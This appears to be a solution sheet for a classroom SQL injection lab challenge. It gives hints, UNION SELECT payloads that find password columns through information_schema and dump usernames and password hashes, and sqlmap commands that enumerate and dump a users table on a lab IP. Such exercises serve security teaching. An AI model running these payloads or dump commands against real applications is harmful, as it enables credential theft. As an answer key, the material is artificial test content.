# SQL injection challenge for Bloom's Taxonomy Level: Analyzing

**hints**
1. User sensitive data is stored in column which name contains 'pass'
1. There is default database table called 'information_schema' where you can find all the information about other databases and its tables.
1. Inside information_schema here is table called 'COLUMNS'. The user can find necessary info from that table
1. Inside table 'COLUMNS' there are columns TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME
1. The user can write sql query and apply all info in one query. After finding databse name, table name, column name just one more query remains till victory.

**Query #1, to output necessarry info**
```sql
' UNION ALL SELECT 1, TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME FROM information_schema.COLUMNS WHERE COLUMN_NAME LIKE '%pass%' #'
```
**Query #2, to output hash flag**
```sql
' UNION ALL SELECT 1, users.pass, users.user, 3 FROM bikodua_level_apply.users #'
```
*Note: databse name will be unique for each user. So, in this query above db name needs to be replaced*

**It is possible to use SQLMap**

- At first a student needs to install SQLmap
```bash
sudo apt-get install sqlmap
#password is student
```
- Then run this script below
```bash
sqlmap --url="http://192.168.8.254/home/ajax" --data="search=h&csrf=F3qt5W6L8TaIwncZSTApFG4qw4dQraHO&action=search" --cookie="PHPSESSID=ecej4q1orlkvspf48ut81fl57v" --csrf-token="csrf" --csrf-url="http://192.168.8.254" --dbms=mysql --dbs --batch
```
**PHPSESSID** needs to be replaced to current active(Signed in) session ID and all the other parameters are fine

- After showing DB name find proper one and run another command
```bash
sqlmap --url="http://192.168.8.254/home/ajax" --data="search=h&csrf=F3qt5W6L8TaIwncZSTApFG4qw4dQraHO&action=search" --cookie="PHPSESSID=ecej4q1orlkvspf48ut81fl57v" --csrf-token="csrf" --csrf-url="http://192.168.8.254" --dbms=mysql --batch -D bikodua_level_apply --tables
```
- then command below and it will output all user data where we can find our desired hash flag
```bash
sqlmap --url="http://192.168.8.254/home/ajax" --data="search=h&csrf=F3qt5W6L8TaIwncZSTApFG4qw4dQraHO&action=search" --cookie="PHPSESSID=ecej4q1orlkvspf48ut81fl57v" --csrf-token="csrf" --csrf-url="http://192.168.8.254" --dbms=mysql --batch -D bikodua_level_apply -T users --dump
```# ITI0103-applying-defense
# ITI0103-applying-defense
